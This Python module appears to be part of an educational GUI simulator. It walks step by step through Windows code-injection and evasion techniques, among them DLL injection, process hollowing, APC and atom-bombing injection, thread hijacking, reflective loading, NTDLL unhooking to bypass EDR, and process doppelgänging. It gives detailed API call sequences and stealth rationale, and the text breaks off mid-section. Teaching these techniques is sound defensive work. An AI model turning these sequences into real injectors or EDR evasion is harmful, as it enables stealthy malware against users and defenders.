"""
Simulation runners — each returns a generator of (step_index, label, detail) tuples
so the GUI can animate them at whatever speed it likes.
"""
import ctypes
import ctypes.wintypes
import platform
import time

IS_WINDOWS = platform.system() == "Windows"

# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _format_hex(data: bytes, width: int = 16) -> str:
    lines = []
    for i in range(0, len(data), width):
        chunk = data[i:i + width]
        hex_part = " ".join(f"{b:02X}" for b in chunk)
        asc_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"  {i:04X}  {hex_part:<{width*3}}  {asc_part}")
    return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# Keylogger concept demo (tkinter-binding based — no system hook installed)
# ─────────────────────────────────────────────────────────────────────────────

VK_NAMES = {
    8:  "VK_BACK",   9: "VK_TAB",   13: "VK_RETURN", 27: "VK_ESCAPE",
    32: "VK_SPACE", 46: "VK_DELETE", 37: "VK_LEFT",   38: "VK_UP",
    39: "VK_RIGHT", 40: "VK_DOWN",  16: "VK_SHIFT",  17: "VK_CONTROL",
    18: "VK_MENU",
}

def key_event_to_row(event) -> dict:
    """Convert a tkinter key event into a KBDLLHOOKSTRUCT-like dict for display."""
    vk = event.keycode
    name = VK_NAMES.get(vk)
    if name is None:
        ch = event.char
        if ch and ch.isprintable():
            name = repr(ch)
        else:
            name = f"VK:0x{vk:02X}"
    scan = vk  # approximate — tkinter doesn't expose real scan codes
    return {
        "vkCode":   f"0x{vk:02X}",
        "scanCode": f"0x{scan:02X}",
        "keyName":  name,
        "flags":    "0x00",
        "time":     int(time.time() * 1000) & 0xFFFFFFFF,
    }


# ─────────────────────────────────────────────────────────────────────────────
# IAT walkthrough
# ─────────────────────────────────────────────────────────────────────────────

IAT_STEPS = [
    (0, "Parse DOS header",
     "Read IMAGE_DOS_HEADER.e_lfanew → offset to IMAGE_NT_HEADERS\n"
     "  → dos->e_lfanew = 0x00E8"),

    (1, "Locate Import Directory",
     "IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[1] = Import Directory\n"
     "  → VirtualAddress = 0x0002A000   Size = 0x0000028C"),

    (2, "Walk Import Descriptors",
     "IMAGE_IMPORT_DESCRIPTOR array (one per imported DLL):\n"
     "  [0] KERNEL32.dll  OriginalFirstThunk=0x2A1C  FirstThunk=0x1000\n"
     "  [1] WS2_32.dll    OriginalFirstThunk=0x2B00  FirstThunk=0x10A0\n"
     "  [2] USER32.dll    OriginalFirstThunk=0x2C00  FirstThunk=0x1100"),

    (3, "Match target DLL: WS2_32.dll",
     "Found at descriptor index 1\n"
     "  → Walking OriginalFirstThunk to find 'connect'\n"
     "  → Ordinal 4 = 'connect'  found at INT[4]"),

    (4, "Read IAT entry (before hook)",
     "IAT[4] (WS2_32!connect) = 0x7FFA_E3C0_1234\n"
     "  → Points to ws2_32.dll .text section (legitimate)"),

    (5, "VirtualProtect → PAGE_READWRITE",
     "VirtualProtect(0x10A8, 8, PAGE_READWRITE, &old)\n"
     "  → old protection = PAGE_READONLY\n"
     "  → Page is now writable"),

    (6, "Overwrite IAT entry with hook address",
     "IAT[4] = 0x0000_0001_4001_5A80   (Hook_connect)\n"
     "  → Saved original: g_origConnect = 0x7FFA_E3C0_1234"),

    (7, "Restore page protection",
     "VirtualProtect(0x10A8, 8, PAGE_READONLY, &old)\n"
     "  → Page restored to read-only"),

    (8, "Hook active",
     "Every call to connect() in this module now routes through:\n"
     "  app.exe!Hook_connect → logs destination → calls original → returns normally\n\n"
     "  IAT[4] BEFORE: 0x7FFA_E3C0_1234  (ws2_32!connect)\n"
     "  IAT[4] AFTER:  0x0000_0001_4001_5A80  (Hook_connect)"),
]


# ─────────────────────────────────────────────────────────────────────────────
# DLL Injection walkthrough
# ─────────────────────────────────────────────────────────────────────────────

DLL_INJECTION_STEPS = [
    (0, "OpenProcess",
     "OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,\n"
     "            FALSE, targetPID=1234)\n"
     "  → hProcess = 0x00000084\n"
     "  → Success: handle to notepad.exe"),

    (1, "VirtualAllocEx — allocate remote string buffer",
     "VirtualAllocEx(hProc=0x84, NULL, size=26, MEM_COMMIT, PAGE_READWRITE)\n"
     "  → remoteAddr = 0x00340000\n\n"
     "  [ target process memory ]\n"
     "  0x00340000  ?? ?? ?? ?? ?? ?? ??   (uninitialized)"),

    (2, "WriteProcessMemory — copy DLL path",
     "WriteProcessMemory(hProc, 0x00340000, 'C:\\\\payload.dll', 26)\n"
     "  → bytesWritten = 26\n\n"
     "  [ target process memory ]\n"
     + _format_hex(b"C:\\\\payload.dll\x00")),

    (3, "Resolve LoadLibraryA address",
     "GetProcAddress(GetModuleHandle('kernel32.dll'), 'LoadLibraryA')\n"
     "  → 0x7FFB_C1A0_3D20  (same in ALL processes — ASLR slides whole dll together)\n\n"
     "  This address will be the thread start routine."),

    (4, "CreateRemoteThread",
     "CreateRemoteThread(\n"
     "    hProc     = 0x84,\n"
     "    lpSA      = NULL,\n"
     "    stackSize = 0,\n"
     "    startAddr = 0x7FFB_C1A0_3D20,   ← LoadLibraryA\n"
     "    arg       = 0x00340000,          ← 'C:\\\\payload.dll'\n"
     "    flags     = 0,\n"
     "    &tid      = 0x1A2C\n"
     "  )\n"
     "  → hThread = 0x00000090\n"
     "  → Remote thread TID=6700 created in notepad.exe"),

    (5, "Remote thread executes LoadLibraryA",
     "  [ inside notepad.exe — remote thread stack ]\n"
     "  ntdll!LdrLoadDll\n"
     "    → maps C:\\\\payload.dll into notepad.exe address space\n"
     "    → resolves imports for payload.dll\n"
     "    → calls DllMain(PROCESS_ATTACH)  ← your payload runs here\n"
     "  LoadLibraryA returns HMODULE = 0x6C000000"),

    (6, "Cleanup",
     "WaitForSingleObject(hThread, 5000)\n"
     "  → Thread exited with code 0x6C000000 (hModule)\n"
     "VirtualFreeEx(hProc, 0x00340000, 0, MEM_RELEASE)\n"
     "CloseHandle(hThread)\n"
     "CloseHandle(hProc)\n\n"
     "  ✓ payload.dll is now loaded and executing inside notepad.exe"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Process Hollowing walkthrough
# ─────────────────────────────────────────────────────────────────────────────

HOLLOWING_STEPS = [
    (0, "Spawn host process suspended",
     "CreateProcess('C:\\\\Windows\\\\System32\\\\svchost.exe', ..., CREATE_SUSPENDED)\n"
     "  → PID = 4488   TID = 4492 (suspended)\n\n"
     "  [ svchost.exe address space ]\n"
     "  0x00400000  [svchost.exe image — mapped by loader]\n"
     "  0x7FF80000  [ntdll.dll]\n"
     "  0x7FF90000  [kernel32.dll]"),

    (1, "Read thread context — locate PEB",
     "GetThreadContext(hThread, &ctx)\n"
     "  → ctx.Rdx = 0x0000_007F_FF80_0000  (PEB base address)\n\n"
     "  ReadProcessMemory(PEB + 0x10, &imageBase)\n"
     "  → PEB.ImageBaseAddress = 0x00400000\n"
     "  → This is where svchost.exe's image is loaded"),

    (2, "Unmap legitimate image",
     "NtUnmapViewOfSection(hProc, 0x00400000)\n"
     "  → STATUS_SUCCESS\n\n"
     "  [ svchost.exe address space — AFTER unmap ]\n"
     "  0x00400000  [       FREE — unmapped        ]\n"
     "  0x7FF80000  [ntdll.dll]\n"
     "  0x7FF90000  [kernel32.dll]"),

    (3, "Allocate space for payload PE",
     "VirtualAllocEx(hProc, 0x00400000, 0x18000, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)\n"
     "  → Allocated at 0x00400000 (preferred base matched)\n\n"
     "  [ svchost.exe address space ]\n"
     "  0x00400000  [   RWX allocation — ready for payload   ]\n"),

    (4, "Write payload PE headers",
     "WriteProcessMemory(hProc, 0x00400000, payloadPE, SizeOfHeaders=0x400)\n"
     "  → Wrote PE headers (MZ, NT headers, section table)\n\n"
     "  0x00400000  MZ header\n"
     "  0x00400040  IMAGE_NT_HEADERS\n"
     "  0x00400178  Section table (.text, .data, .rsrc)"),

    (5, "Write payload sections",
     "WriteProcessMemory → .text @ 0x00401000  (code)\n"
     "WriteProcessMemory → .data @ 0x00412000  (data)\n"
     "WriteProcessMemory → .rsrc @ 0x00415000  (resources)\n\n"
     "  All sections written successfully\n"
     "  Payload image fully mapped in host process memory"),

    (6, "Fix PEB.ImageBaseAddress",
     "WriteProcessMemory(PEB + 0x10, &newBase=0x00400000)\n"
     "  → PEB.ImageBaseAddress updated\n"
     "  → Process thinks it IS the payload executable"),

    (7, "Redirect entry point and resume",
     "ctx.Rcx = 0x00400000 + AddressOfEntryPoint (= 0x00401A80)\n"
     "SetThreadContext(hThread, &ctx)\n"
     "ResumeThread(hThread)\n\n"
     "  → Main thread RIP = 0x00401A80\n"
     "  → svchost.exe process now executes payload\n"
     "  → Task Manager shows 'svchost.exe' — completely legitimate looking"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Shellcode injection — real VirtualAlloc demo
# ─────────────────────────────────────────────────────────────────────────────

def run_shellcode_sim():
    """
    Allocates a real RW page, writes sample bytes, flips to RX, then frees it.
    Returns a list of (label, detail) strings describing each step.
    No code is executed — PAGE_EXECUTE_READ allocation is freed immediately.
    """
    steps = []
    sc_bytes = bytes([0x90] * 16 + [0xC3])  # 16x NOP + RET — totally harmless

    if not IS_WINDOWS:
        return [
            ("Note", "This simulation requires Windows. Steps shown below are illustrative."),
            ("VirtualAlloc", "Would allocate RW page for shellcode bytes"),
            ("WriteBytes", f"Would write {len(sc_bytes)} bytes of shellcode"),
            ("VirtualProtect", "Would flip to PAGE_EXECUTE_READ"),
            ("VirtualFree", "Page released — no execution"),
        ]

    PAGE_READWRITE      = 0x04
    PAGE_EXECUTE_READ   = 0x20
    MEM_COMMIT          = 0x1000
    MEM_RESERVE         = 0x2000
    MEM_RELEASE         = 0x8000

    steps.append(("Shellcode bytes", f"Payload ({len(sc_bytes)} bytes):\n" + _format_hex(sc_bytes)))

    # 1. Allocate RW
    addr = ctypes.windll.kernel32.VirtualAlloc(
        None, len(sc_bytes), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)

    if not addr:
        steps.append(("VirtualAlloc", f"FAILED — GetLastError={ctypes.windll.kernel32.GetLastError()}"))
        return steps

    steps.append(("VirtualAlloc (RW)",
                  f"VirtualAlloc(NULL, {len(sc_bytes)}, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)\n"
                  f"  → Allocated at 0x{addr:016X}\n"
                  f"  → Page permissions: READ | WRITE"))

    # 2. Write bytes
    buf = (ctypes.c_char * len(sc_bytes))(*sc_bytes)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(addr), buf, len(sc_bytes))
    steps.append(("WriteProcessMemory",
                  f"RtlMoveMemory(0x{addr:016X}, shellcode, {len(sc_bytes)})\n"
                  f"  → Bytes written successfully\n"
                  f"  Memory contents at 0x{addr:016X}:\n"
                  + _format_hex(sc_bytes)))

    # 3. Flip to RX
    old = ctypes.c_ulong(0)
    ok = ctypes.windll.kernel32.VirtualProtect(
        ctypes.c_void_p(addr), len(sc_bytes), PAGE_EXECUTE_READ, ctypes.byref(old))
    steps.append(("VirtualProtect → RX",
                  f"VirtualProtect(0x{addr:016X}, {len(sc_bytes)}, PAGE_EXECUTE_READ, &old)\n"
                  f"  → old = 0x{old.value:02X}  (PAGE_READWRITE)\n"
                  f"  → Page is now EXECUTE | READ\n"
                  f"  → Ready for execution (but we will NOT execute — demo only)"))

    # 4. Free immediately — no execution
    ctypes.windll.kernel32.VirtualFree(ctypes.c_void_p(addr), 0, MEM_RELEASE)
    steps.append(("VirtualFree",
                  f"VirtualFree(0x{addr:016X}, 0, MEM_RELEASE)\n"
                  f"  → Memory released\n"
                  f"  → No code was executed — this was a demonstration only"))

    return steps


# ─────────────────────────────────────────────────────────────────────────────
# APC Injection walkthrough
# ─────────────────────────────────────────────────────────────────────────────

APC_STEPS = [
    (0, "Spawn host process suspended",
     "CreateProcess('C:\\\\Windows\\\\System32\\\\svchost.exe',\n"
     "               ..., CREATE_SUSPENDED)\n"
     "  → PID=6200  TID=6204\n"
     "  → Process paused before any code runs"),

    (1, "Allocate + write shellcode",
     "VirtualAllocEx(hProc, NULL, scLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n"
     "  → remoteAddr = 0x00260000\n\n"
     "WriteProcessMemory(hProc, 0x00260000, shellcode, scLen)\n"
     "  → Shellcode planted in host process"),

    (2, "Queue APC to main thread",
     "QueueUserAPC(\n"
     "    (PAPCFUNC)0x00260000,  ← shellcode address\n"
     "    hMainThread,\n"
     "    0\n"
     ")\n"
     "  → APC queued to TID=6204's APC queue\n\n"
     "  [ APC Queue for TID=6204 ]\n"
     "  ┌─────────────────────────────────────────┐\n"
     "  │  APC #0: fn=0x00260000  arg=0x00000000  │\n"
     "  └─────────────────────────────────────────┘"),

    (3, "Resume thread",
     "ResumeThread(hMainThread)\n"
     "  → Suspend count decremented to 0\n"
     "  → Main thread begins executing ntdll!_LdrpInitializeProcess"),

    (4, "APC fires during alertable wait",
     "  [ Thread execution trace ]\n"
     "  ntdll!LdrpInitializeProcess\n"
     "    ntdll!NtWaitForSingleObject  ← alertable wait!\n"
     "      ntdll!KiUserApcDispatcher  ← OS drains APC queue\n"
     "        → 0x00260000 (shellcode)  ← YOUR CODE RUNS HERE\n\n"
     "  Shellcode executes on the MAIN thread of svchost.exe\n"
     "  Process appears completely legitimate"),

    (5, "Result",
     "  ✓ Shellcode executed on TID=6204 (main thread of svchost.exe)\n"
     "  ✓ No new threads created (invisible to thread enumeration)\n"
     "  ✓ Parent process appears as SERVICES.EXE (normal)\n"
     "  ✓ EDR thread-creation hooks NOT triggered"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Thread Hijacking walkthrough
# ─────────────────────────────────────────────────────────────────────────────

HIJACK_STEPS = [
    (0, "Find target thread",
     "CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)\n"
     "  Threads in notepad.exe (PID=3300):\n"
     "  TID=3304  WaitReason=UserRequest  (safe to hijack)\n"
     "  TID=3308  WaitReason=Executive    (kernel wait — risky)\n"
     "  → Selected TID=3304"),

    (1, "Suspend thread",
     "OpenThread(THREAD_ALL_ACCESS, FALSE, 3304)\n"
     "  → hThread = 0x000000A4\n\n"
     "SuspendThread(hThread)\n"
     "  → SuspendCount: 0 → 1\n"
     "  → Thread is now frozen"),

    (2, "Capture CPU context",
     "GetThreadContext(hThread, &ctx)\n"
     "  Register state before hijack:\n"
     "  RIP = 0x7FFB_C1A1_0028  (ntdll!NtWaitForSingleObject+0x14)\n"
     "  RSP = 0x0000_00B4_F950  (stack pointer)\n"
     "  RAX = 0x0000_0000_0000  (return value from syscall)\n"
     "  RBX = 0x0000_0070_4200  (some local variable)\n"
     "  ..."),

    (3, "Plant shellcode in target",
     "VirtualAllocEx(hProc, NULL, scLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n"
     "  → 0x007F_0000\n\n"
     "WriteProcessMemory(hProc, 0x007F_0000, shellcode, scLen)\n"
     "  → shellcode written (includes restore-ctx stub)"),

    (4, "Redirect RIP to shellcode",
     "ctx.Rip = 0x007F_0000  ← shellcode address\n"
     "(original saved for later restoration)\n\n"
     "SetThreadContext(hThread, &ctx)\n"
     "  → Thread context committed\n\n"
     "  Register state AFTER patch:\n"
     "  RIP = 0x007F_0000   ← PATCHED\n"
     "  RSP = 0x0000_00B4_F950  (unchanged)\n"
     "  RAX = 0x0000_0000_0000  (unchanged)"),

    (5, "Resume and execute",
     "ResumeThread(hThread)\n"
     "  → SuspendCount: 1 → 0\n"
     "  → Thread resumes at 0x007F_0000\n\n"
     "  Shellcode executes — should end with:\n"
     "    mov rip, savedOriginalRip   ; restore\n"
     "    jmp savedOriginalRip        ; return to legitimate code\n\n"
     "  ✓ No new threads created\n"
     "  ✓ Execution happened on legitimate thread TID=3304"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Reflective DLL walkthrough
# ─────────────────────────────────────────────────────────────────────────────

REFLECTIVE_STEPS = [
    (0, "Injector: copy raw DLL bytes",
     "VirtualAllocEx(hProc, NULL, dllSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n"
     "  → remoteBlob = 0x00C0_0000\n\n"
     "WriteProcessMemory(hProc, remoteBlob, rawDllBytes, dllSize)\n"
     "  → Raw DLL blob written (NOT loaded by Windows loader)\n"
     "  → PEB module list is UNCHANGED — DLL is invisible"),

    (1, "Find ReflectiveLoader offset",
     "Scan the DLL's export table for 'ReflectiveLoader'\n"
     "  → Export RVA = 0x00001A80\n"
     "  → Absolute in remote: 0x00C0_0000 + 0x1A80 = 0x00C0_1A80"),

    (2, "CreateRemoteThread → ReflectiveLoader",
     "CreateRemoteThread(hProc, NULL, 0,\n"
     "    (LPTHREAD_START_ROUTINE)0x00C0_1A80,  ← ReflectiveLoader\n"
     "    NULL, 0, NULL)\n"
     "  → Remote thread starts in DLL's bootstrap code"),

    (3, "ReflectiveLoader: PEB walk for kernel32",
     "  [ inside target process — ReflectiveLoader running ]\n"
     "  PEB → PEB.Ldr → InMemoryOrderModuleList\n"
     "    → hash each module name:\n"
     "    'ntdll.dll'     hash=0x1EDAB0ED\n"
     "    'kernel32.dll'  hash=0x6A4ABC5B  ← FOUND\n"
     "  → kernel32 base = 0x7FFB_C1A0_0000"),

    (4, "Hash-based API resolution",
     "  Walk kernel32 export table, hash each name:\n"
     "  'VirtualAlloc'   → 0x91AFCA54  ← FOUND @ 0x7FFB_C1A0_5600\n"
     "  'LoadLibraryA'   → 0x726774C  ← FOUND @ 0x7FFB_C1A0_3D20\n"
     "  'GetProcAddress' → 0x7C0DFCAA  ← FOUND @ 0x7FFB_C1A0_4100\n\n"
     "  No import table used — completely self-contained"),

    (5, "Map new image from raw blob",
     "  pVirtualAlloc(preferredBase, imageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n"
     "  → newBase = 0x6C000000\n\n"
     "  Copy headers to newBase\n"
     "  Copy .text  → newBase + 0x1000\n"
     "  Copy .data  → newBase + 0x12000\n"
     "  Copy .rsrc  → newBase + 0x15000"),

    (6, "Process imports & relocations",
     "  Import directory: WINHTTP.dll, USER32.dll\n"
     "  → pLoadLibraryA('WINHTTP.dll') → 0x7FFC_0001_0000\n"
     "  → pGetProcAddress → resolve each import\n\n"
     "  Base delta = 0x6C000000 - preferredBase (if different)\n"
     "  → Apply IMAGE_BASE_RELOCATION patches to .text"),

    (7, "Call DllMain → payload runs",
     "  pDllMain = newBase + AddressOfEntryPoint = 0x6C001A00\n"
     "  pDllMain(newBase, DLL_PROCESS_ATTACH, NULL)\n\n"
     "  ✓ DLL initialized\n"
     "  ✓ No entry in PEB.Ldr (invisible to EnumProcessModules)\n"
     "  ✓ No file on disk\n"
     "  ✓ Loader never involved"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Atom Bombing walkthrough
# ─────────────────────────────────────────────────────────────────────────────

ATOM_STEPS = [
    (0, "Fragment shellcode",
     "Shellcode length: 512 bytes\n"
     "Chunk size limit: 255 bytes (atom name max)\n\n"
     "  chunk[0] = shellcode[0..254]   (255 bytes)\n"
     "  chunk[1] = shellcode[255..511]  (257 bytes → split at 254)\n"
     "  Result: 3 chunks"),

    (1, "Store chunks in global atom table",
     "GlobalAddAtomW(chunk0_as_wstr)  → atom=0xC001\n"
     "GlobalAddAtomW(chunk1_as_wstr)  → atom=0xC002\n"
     "GlobalAddAtomW(chunk2_as_wstr)  → atom=0xC003\n\n"
     "  [ Global Atom Table ]\n"
     "  0xC001  → [255 bytes of shellcode part 1]\n"
     "  0xC002  → [255 bytes of shellcode part 2]\n"
     "  0xC003  → [  2 bytes of shellcode part 3]"),

    (2, "Find alertable thread in target",
     "Scan threads in target process (e.g. Chrome renderer)\n"
     "  → TID=9800 is in alertable wait (WaitForMultipleObjectsEx)\n"
     "  → Open with OpenThread(THREAD_SET_CONTEXT, FALSE, 9800)"),

    (3, "Allocate destination buffer in target",
     "VirtualAllocEx(hProc, NULL, 512, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n"
     "  → dest = 0x00DE0000\n\n"
     "  (Note: no WriteProcessMemory needed for shellcode bytes!\n"
     "   The atom table copy mechanism does the writing)"),

    (4, "Queue APCs to copy each atom chunk",
     "NtQueueApcThread(hThread, GlobalGetAtomNameW, 0xC001, dest+0,   255*2)\n"
     "NtQueueApcThread(hThread, GlobalGetAtomNameW, 0xC002, dest+255, 255*2)\n"
     "NtQueueApcThread(hThread, GlobalGetAtomNameW, 0xC003, dest+510, 255*2)\n\n"
     "  [ APC Queue for TID=9800 ]\n"
     "  APC#0: GlobalGetAtomNameW(0xC001 → dest+0)\n"
     "  APC#1: GlobalGetAtomNameW(0xC002 → dest+255)\n"
     "  APC#2: GlobalGetAtomNameW(0xC003 → dest+510)"),

    (5, "Cleanup atom table",
     "GlobalDeleteAtom(0xC001)\n"
     "GlobalDeleteAtom(0xC002)\n"
     "GlobalDeleteAtom(0xC003)\n\n"
     "  Atoms removed — no trace in shared table"),

    (6, "APCs fire — shellcode assembled",
     "  Thread 9800 returns from alertable wait...\n"
     "  → OS dispatches APC queue:\n"
     "    APC#0 fires → 0x00DE0000[0..254]   = shellcode part 1\n"
     "    APC#1 fires → 0x00DE0000[255..509] = shellcode part 2\n"
     "    APC#2 fires → 0x00DE0000[510..511] = shellcode part 3\n\n"
     "  ✓ Shellcode fully assembled at 0x00DE0000\n"
     "  ✓ No VirtualAllocEx for data, no WriteProcessMemory — bypassed!"),

    (7, "Execute shellcode",
     "Queue a final APC pointing to the assembled shellcode:\n"
     "NtQueueApcThread(hThread, (PAPCFUNC)0x00DE0000, 0, 0, 0)\n\n"
     "  → Next alertable wait: shellcode executes on TID=9800\n"
     "  ✓ Classic WPM/CRT tripwire completely avoided"),
]


# ─────────────────────────────────────────────────────────────────────────────
# NTDLL Unhooking walkthrough
# ─────────────────────────────────────────────────────────────────────────────

UNHOOK_STEPS = [
    (0, "Detect EDR hooks",
     "Scan ntdll.dll .text section in memory:\n\n"
     "  NtAllocateVirtualMemory  +0x00: E9 XX XX XX XX  ← JMP hook!\n"
     "  NtWriteVirtualMemory     +0x00: E9 XX XX XX XX  ← JMP hook!\n"
     "  NtCreateThreadEx         +0x00: E9 XX XX XX XX  ← JMP hook!\n"
     "  NtReadVirtualMemory      +0x00: 4C 8B D1 ...    (clean)\n\n"
     "  3 hooks detected — injected by EDR driver at process start"),

    (1, "Open ntdll.dll on disk",
     "CreateFileA('C:\\\\Windows\\\\System32\\\\ntdll.dll',\n"
     "             GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING)\n"
     "  → hFile = 0x000000BC\n"
     "  → File size: 2,105,344 bytes"),

    (2, "Read clean .text from disk",
     "MapViewOfFile or ReadFile → diskBuffer\n"
     "  → diskBuffer @ 0x02000000 (local allocation)\n\n"
     "  Disk NtAllocateVirtualMemory  +0x00: 4C 8B D1 B8 18 00 00 00 0F 05\n"
     "  (clean syscall stub — no hook)"),

    (3, "Locate .text section boundaries",
     "Parse diskBuffer PE headers:\n"
     "  .text section  VA=0x00001000  RawOff=0x400  Size=0x12A000\n\n"
     "  In-memory .text:  0x7FFB_DD00_1000 → 0x7FFB_DD12_B000\n"
     "  Disk .text copy:  0x02000400 → 0x0212A400"),

    (4, "VirtualProtect .text → RWX",
     "VirtualProtect(\n"
     "    0x7FFB_DD00_1000,\n"
     "    0x12A000,\n"
     "    PAGE_EXECUTE_READWRITE,\n"
     "    &oldProtect\n"
     ")\n"
     "  → oldProtect = PAGE_EXECUTE_READ\n"
     "  → .text is now writable"),

    (5, "Overwrite hooked bytes with clean bytes",
     "memcpy(\n"
     "    0x7FFB_DD00_1000,   ← in-memory ntdll .text\n"
     "    diskTextPtr,         ← clean disk copy\n"
     "    0x12A000\n"
     ")\n\n"
     "  After restore:\n"
     "  NtAllocateVirtualMemory +0x00: 4C 8B D1 B8 18 00 00 00 0F 05  ← clean!\n"
     "  NtWriteVirtualMemory    +0x00: 4C 8B D1 B8 3A 00 00 00 0F 05  ← clean!\n"
     "  NtCreateThreadEx        +0x00: 4C 8B D1 B8 C1 00 00 00 0F 05  ← clean!"),

    (6, "Restore page protection",
     "VirtualProtect(0x7FFB_DD00_1000, 0x12A000, PAGE_EXECUTE_READ, &old)\n"
     "  → .text restored to PAGE_EXECUTE_READ\n\n"
     "VirtualFree(diskBuffer, 0, MEM_RELEASE)\n"
     "CloseHandle(hFile)"),

    (7, "All hooks removed",
     "  ✓ EDR user-mode hooks are gone\n"
     "  ✓ Subsequent NTDLL syscalls bypass EDR monitoring\n"
     "  ✓ VirtualAllocEx, WriteProcessMemory, CreateRemoteThread etc.\n"
     "    now execute without EDR interception\n\n"
     "  Note: kernel-mode callbacks (ETW, PsSetCreateProcessNotifyRoutine)\n"
     "  are NOT affected — this only removes user-mode hooks."),
]


# ─────────────────────────────────────────────────────────────────────────────
# Process Doppelgänging walkthrough
# ─────────────────────────────────────────────────────────────────────────────

DOPPELGANGING_STEPS = [
    (0, "Create NTFS transaction",
     "CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL)\n"
     "  → hTransaction = 0x000000C8\n\n"
     "  An NTFS kernel transaction is now open.\n"
     "  Any file operations performed with this handle operate in\n"
     "  an isolated, uncommitted view — invisible to other processes."),

    (1, "Open host file within transaction",
     "CreateFileTransactedW(\n"
     "    L'C:\\\\Windows\\\\System32\\\\svchost.exe',\n"
     "    GENERIC_WRITE | GENERIC_READ,\n"
     "    0, NULL, OPEN_EXISTING,\n"
     "    FILE_ATTRIBUTE_NORMAL, NULL,\n"
     "    hTransaction, NULL, NULL\n"
     ")\n"
     "  → hTransactedFile = 0x000000D0\n\n"
     "  [ Disk state — unchanged ]\n"
     "  svchost.exe = [legitimate Microsoft binary, SHA256=AABBCC...]\n\n"
     "  [ Transaction view ]\n"
     "  svchost.exe = [same — not yet modified]"),

    (2, "Write malicious PE into transaction",
     "WriteFile(hTransactedFile, maliciousPE, payloadSize, &written, NULL)\n"
     "  → written = 143,360 bytes\n\n"
     "  [ Disk state — STILL unchanged ]\n"
     "  svchost.exe = [legitimate Microsoft binary]\n\n"
     "  [ Transaction view — MODIFIED ]\n"
     "  svchost.exe = [malicious PE — visible only within this transaction]"),

    (3, "Create image section from transacted file",
     "NtCreateSection(\n"
     "    &hSection,\n"
     "    SECTION_ALL_ACCESS,\n"
     "    NULL, NULL,\n"
     "    PAGE_READONLY,\n"
     "    SEC_IMAGE,           ← map as executable image\n"
     "    hTransactedFile      ← uses transaction's view\n"
     ")\n"
     "  → hSection = 0x000000E0\n"
     "  → Section created from the MALICIOUS transacted content\n"
     "  → This section is now INDEPENDENT of the file on disk"),

    (4, "Roll back transaction — disk reverts",
     "RollbackTransaction(hTransaction)\n"
     "  → STATUS_SUCCESS\n\n"
     "  [ Disk state — RESTORED ]\n"
     "  svchost.exe = [legitimate Microsoft binary — malicious write GONE]\n\n"
     "  [ Section hSection — UNCHANGED ]\n"
     "  Still contains the malicious PE image\n"
     "  The kernel section object is decoupled from the file after creation."),

    (5, "Create process from the malicious section",
     "NtCreateProcessEx(\n"
     "    &hProcess,\n"
     "    PROCESS_ALL_ACCESS,\n"
     "    NULL,\n"
     "    GetCurrentProcess(),\n"
     "    0,\n"
     "    hSection,            ← malicious image\n"
     "    NULL, NULL, FALSE\n"
     ")\n"
     "  → hProcess = 0x000000F0  (PID = 5512)\n\n"
     "  PEB.ImageBaseAddress → malicious PE\n"
     "  PEB.ProcessParameters.ImagePathName → 'C:\\Windows\\System32\\svchost.exe'\n"
     "  Task Manager shows: svchost.exe  ← looks completely legitimate"),

    (6, "Create thread at entry point + execute",
     "NtCreateThreadEx(hProcess, AddressOfEntryPoint)\n"
     "  → Thread starts — malicious payload executes\n\n"
     "  ✓ On-disk file: clean (transaction rolled back)\n"
     "  ✓ Process name: svchost.exe (legitimate)\n"
     "  ✓ Image path: C:\\Windows\\System32\\svchost.exe\n"
     "  ✓ Disk hash: matches legitimate Microsoft binary\n"
     "  ✗ Running code: malicious PE\n\n"
     "  Note: Windows 10 1803+ blocks SEC_IMAGE on transacted files (KB4093119)"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Heaven's Gate walkthrough
# ─────────────────────────────────────────────────────────────────────────────

HEAVENS_GATE_STEPS = [
    (0, "WOW64 architecture overview",
     "  32-bit process on 64-bit Windows — WOW64 layer:\n\n"
     "  [ 32-bit process address space ]\n"
     "  0x00400000  app.exe (32-bit)\n"
     "  0x77800000  ntdll.dll (32-bit)  ← EDR hooks live HERE\n"
     "  0x77A00000  wow64.dll\n"
     "  0x77B00000  wow64win.dll\n"
     "  0x7FFE0000  KUSER_SHARED_DATA\n\n"
     "  [ 64-bit address space — same process, higher addresses ]\n"
     "  0x7FFB_0000_0000  ntdll.dll (64-bit)  ← clean stubs here"),

    (1, "Confirm WOW64 and locate 64-bit NTDLL",
     "IsWow64Process(GetCurrentProcess(), &isWow64)\n"
     "  → isWow64 = TRUE\n\n"
     "Read TEB64 from FS:[0xC0] (WOW64 stores 64-bit TEB pointer here):\n"
     "  → TEB64 @ 0x7F_FF80_0000\n"
     "  → PEB64 @ TEB64[0x60] = 0x7F_FF81_0000\n"
     "  → PEB64.Ldr → walk InMemoryOrderModuleList\n"
     "  → ntdll64 base = 0x7FFB_DD00_0000"),

    (2, "Find target syscall stub in 64-bit NTDLL",
     "Walk ntdll64 export table for 'NtAllocateVirtualMemory':\n"
     "  → RVA = 0x0000A180\n"
     "  → VA  = 0x7FFB_DD00_A180\n\n"
     "  Read stub bytes:\n"
     "  7FFB_DD00_A180:  4C 8B D1     mov r10, rcx\n"
     "  7FFB_DD00_A183:  B8 18 00 00  mov eax, 0x18   ← SSN = 0x18\n"
